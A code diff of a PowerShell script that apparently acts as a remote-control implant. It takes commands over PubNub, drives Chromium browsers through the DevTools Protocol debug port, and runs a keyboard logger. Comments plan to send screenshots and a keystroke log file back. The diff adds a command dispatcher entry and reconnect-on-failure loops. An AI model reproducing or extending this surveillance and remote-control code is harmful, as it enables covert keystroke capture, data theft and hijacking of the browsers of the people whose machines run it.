@@ -296,20 +296,20 @@ $script:runtime_addBinding_callback = {
     $this.sendQueue.Add( @{ method="Runtime.evaluate"; params=$params; addsessionid=$true; callback=$script:runtime_evaluate_callback } )
 }
 
-<# 
-Target.attachToTarget response payload:
-{
-  "id": 2,
-  "result": {
-    "sessionId": "A1B2C3D4E5F6..."
-  }
-}
-#>
 $script:init_sessionid_action = {
     param(
         [object]$Response, [PSCDP]$cdpobj
     )
 
+    <# 
+        Target.attachToTarget response payload:
+        {
+            "id": 2,
+            "result": {
+                "sessionId": "A1B2C3D4E5F6..."
+            }
+        }
+    #>
     $cdpobj.sessionId = $Response['result'].sessionId
 
     $this.sendQueue.Add( @{ method="Runtime.addBinding"; params=@{ name="onPubNubEvent" }; addsessionid=$true; callback=$script:runtime_addBinding_callback } )
@@ -339,6 +339,12 @@ $script:get_targets_action = {
 
     $cdpobj.sendQueue.Add( @{ method="Target.attachToTarget"; params=$params; callback=$init_sessionid_action } )
 
+}
+
+function Exec-CDP {
+    param($cmd)
+
+    Log-Msg "pass"
 }
 
 function Process-CDP {
@@ -418,6 +424,8 @@ function Process-PubNubEvent {
         $result = Get-FrontendUrls
     } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
         $result = Process-CDP($cmd)
+    } elseif ( $cmd.builtincmd -eq "ExecCDPCommand" ) {
+        $result = Exec-CDP($cmd)
     }
 
     $resultout['result'] = $result
@@ -426,11 +434,6 @@ function Process-PubNubEvent {
 
     # GetScreenshot  --> send back image as base64 string --> requires chunking
     # GetKeyboardLog --> send back owdkeyboardlog.txt file --> might also require chunking
-
-    # HTTP request
-    # issue Invoke-WebRequest to client frontend url with path
-    # https://chrome-devtools-frontend.appspot.com/serve_rev/@199a3a541d76237379e353b348e64045584db057/inspector.html?ws=localhost:9223/devtools/page/AF0A1A7626286253F21401C651C983B0
-    # retrieve HTTP with headers, body, etc. and forward to pubnub
 
 }
 
@@ -470,7 +473,6 @@ class PSCDP {
 
     $wsUri = $null
     $websocket = $null
-    $targets = $null
 
     $sendQueue = [System.Collections.Concurrent.BlockingCollection[object]]::new()
     $responses = [System.Collections.Generic.List[object]]::new()
@@ -492,17 +494,13 @@ class PSCDP {
     $result = $null
     $addbinding_ok = $false
     $executionContextId = $null
-    $console_log_check = $false
-    
-    # TODO need to track current active target, sessionId should be extracted from this active target
-    $activeTarge = $null # [PSCDPTarget]
+    $console_log_check = $false    
     $sessionId = $null
 
 
     [void] Reset() {
         $this.wsUri = $null
         $this.websocket = $null
-        $this.targets = $null
     
         $this.sendQueue = [System.Collections.Concurrent.BlockingCollection[object]]::new()
         $this.responses = [System.Collections.Generic.List[object]]::new()
@@ -524,7 +522,6 @@ class PSCDP {
         $this.result = $null
         $this.addbinding_ok = $false
         $this.executionContextId = $null
-        $this.activeTarge = $null # [PSCDPTarget]
         $this.sessionId = $null
         $this.console_log_check = $false
     }
@@ -571,32 +568,30 @@ class PSCDP {
             return $this.wsUri
         }
 
-        $this.targets = $this.GetTargets()
+        $targets = $this.GetTargets()
 
-        # if init page is set, filter using init page
         if ( ! [string]::IsNullOrEmpty($this.initpage) ) {
-            $this.wsUri = ($this.targets | Where-Object { $_.url -eq $this.initpage } | Select-Object -First 1).webSocketDebuggerUrl
+            $this.wsUri = ($targets | Where-Object { $_.url -eq $this.initpage } | Select-Object -First 1).webSocketDebuggerUrl
         } else {
-            $this.wsUri = ($this.targets | Select-Object -First 1).webSocketDebuggerUrl
+            $this.wsUri = ($targets | Select-Object -First 1).webSocketDebuggerUrl
         }
-        
+
         return $this.wsUri
     }
 
     # TODO refactor to PSCDPTarget
     [object] GetTargets() {
         try {
-            $this.targets = Invoke-RestMethod -Uri "http://localhost:$($this.debugport)/json" -ErrorAction Stop
+            $ttargets = Invoke-RestMethod -Uri "http://localhost:$($this.debugport)/json" -ErrorAction Stop
         } catch [System.Net.WebException] {
             Log-Msg "[N3U8]: $($_.Exception.Message)"
             return $null
-        }        
-
+        }
 
         # $targets | Select-Object title, id, webSocketDebuggerUrl
-        $this.targets = $this.targets | Where-Object { $_.type -eq "page" }
+        $ttargets = $ttargets | Where-Object { $_.type -eq "page" }
 
-        return $this.targets
+        return $ttargets
     }
 
     [void] ConnectCdp() {
@@ -859,7 +854,7 @@ class PSCDP {
         
         $iserror = $false
         $isresult = $false
-        $newtarget = $false
+        $attachedToTarget = $false # Target.attachedToTarget
         $bindingCalled = $false
         $consoleAPICalled = $false
         $executionContextCreated = $false
@@ -873,7 +868,7 @@ class PSCDP {
                 $isresult = $true
             } elseif ( $_.Name -eq "method" )  {
                 if ( $_.Value -eq 'Target.attachedToTarget' ) {
-                    $newtarget = $true
+                    $attachedToTarget = $true
                 } elseif ( $_.Value -eq 'Runtime.bindingCalled' ) {
                     $bindingCalled = $true
                 } elseif ( $_.Value -eq 'Runtime.consoleAPICalled' ) {
@@ -896,13 +891,6 @@ class PSCDP {
         }
 
         $this.responses.Add($msght)
-
-        # check if new target attached, get sessionid
-        if ( $newtarget -and $this.resetonattach ) {
-            if ( ( $msght['params'].Value.targetInfo.type -eq "page" ) -and ( $msght['params'].Values.targetInfo.url -eq $this.initpage ) ) {
-                throw "resetting CDP connection"
-            }
-        }
 
         $iserror = $iserror -or $this.IsMessageError($msght)
         if ( $iserror ) {
@@ -928,10 +916,8 @@ class PSCDP {
             if ( $msght['params'].name -eq "onPubNubEvent" ) { # $msght['params'].payload
                 Log-Msg "processing incomming PubNub event"
                 $this.pubnubmsgs.Add($msght)
-                $payload = $msght['params'].payload # works - able to receive pubnub messages from browser
+                $payload = $msght['params'].payload
                 Process-PubNubEvent -Message $payload
-                # name = onPubNubEvent
-                # payload = "{"type":"message 1234","message":{"msgstr":"test 41234 10:11:46.449"}}"
             } # $pubnubmsg
         }
 
@@ -998,17 +984,6 @@ class PSCDP {
 
     }
 
-    <#
-    {
-    "method": "Runtime.bindingCalled",
-    "params": {
-        "name": "pubnub_binding",
-        "payload": "{\"channel\":\"chat-room\",\"message\":\"Hello from the webpage!\"}",
-        "executionContextId": 1
-    }
-    }
-    #>
-
     [void] LoadQueue() {
         $this.sendQueue.Add( @{ method="Page.enable"; params=@{ enabled = $true } } )
         $this.sendQueue.Add( @{ method="Page.setLifecycleEventsEnabled"; params=@{ enabled = $true } } )
@@ -1016,21 +991,6 @@ class PSCDP {
         $this.sendQueue.Add( @{ method="Runtime.enable"; params=@{ enabled = $true } } )    # generates Runtime.executionContextCreated message
         $this.sendQueue.Add( @{ method="Overlay.enable"; params=@{ enabled = $true } } )
     
-        <#
-          "method": "Target.attachedToTarget",
-            "params": {
-                "sessionId": "5FADB21AF3F5802B43EAF442BBFE0FE3",
-                "targetInfo": {
-                    "targetId": "7CFC0C05A596ADCA9E733CEA6347F0E0",
-                    "type": "page",
-                    "title": "Example Page",
-                    "url": "https://example.com",
-                    "attached": true,
-                    "canAccessOpener": false
-                },
-                "waitingForDebugger": false
-            }
-        #>
         $params = @{
             autoAttach = $true
             waitForDebuggerOnStart = $false
@@ -1038,27 +998,7 @@ class PSCDP {
         }
         $this.sendQueue.Add( @{ method="Target.setAutoAttach"; params=$params } ) 
     
-        <#
-        if ( [string]::IsNullOrWhiteSpace($this.initpage) ) {
-
-            $params = @{
-                url = $this.initpage
-                newWindow = $false
-                # browserContextId = $null
-                # "width": 10,
-                # "height": 10,
-                # // "left": 2000,
-                # "top": 2000
-                # #"windowState": "minimized"
-                # #"hidden": True --> has problems/issues
-            }
-
-            $this.sendQueue.Add( @{ name="navigate_init_page"; method="Target.createTarget"; params=$params } )
-        }
-        #>
-
         $this.sendQueue.Add( @{ method="Target.getTargets"; callback=$script:get_targets_action })
-
     }
 
     [void] SendPBMessage([hashtable]$cmd) {
@@ -1126,7 +1066,8 @@ $script:pubnubws.LoadQueue()
 $script:pubnubws.ConnectCdp()
 
 $script:clientws = [PSCDP]::new($clientport)
-$script:clientws.ConnectCdp() # could fail --> if it fails
+$script:clientws.LoadQueue()
+$script:clientws.ConnectCdp()
 
 $keyboardlogger = {
     try {
@@ -1148,12 +1089,13 @@ while ( $true ) {
 
     # ! need to implement cmd to reset all memory as responses/cmds might take up too much space
 
-    Log-Msg "new iteration"
+    Log-Msg "new iteration -- $i/$n"
 
     $script:pubnubws.LogState() # TODO need to check if pubnub connection is active
-    $script:pubnubws.CheckSocket()
 
     try {
+        $script:pubnubws.CheckSocket()
+
         $script:pubnubws.InitReceive()
         $script:pubnubws.ReadMessage()
         $script:pubnubws.EndMessage()
@@ -1178,19 +1120,23 @@ while ( $true ) {
     }
 
 
+    try {
+        $script:clientws.CheckSocket()
 
-    # ---
-    # $script:clientws.LogState()
-    $script:clientws.CheckSocket()
-    # reconnect if not active --> browser might not be running at all, should be 
-    # able to deal with this edge case
+        $script:clientws.InitReceive()
+        $script:clientws.ReadMessage()
+        $script:clientws.EndMessage()
 
-    $script:clientws.InitReceive()
-    $script:clientws.ReadMessage()
-    $script:clientws.EndMessage()
+        $script:clientws.ExecCallbacks()
+        $script:clientws.NextCmd()
+    } catch {
+        Write-Error $($_.Exception.Message)
+        Write-Host $_.ScriptStackTrace -ForegroundColor DarkGray
 
-    $script:clientws.ExecCallbacks()
-    $script:clientws.NextCmd()
+        $script:clientws.Reset()
+        $script:clientws.LoadQueue()
+        $script:clientws.ConnectCdp()
+    }
 
     Log-Msg "...sleeping"
 
@@ -1199,10 +1145,6 @@ while ( $true ) {
 }
 
 exit
-
-# http://localhost:9223/json --> list of targets, filter on type: page
-# devtoolsFrontendUrl
-# send back to host
 
 <#
 if ( $null -eq $readtask ) {
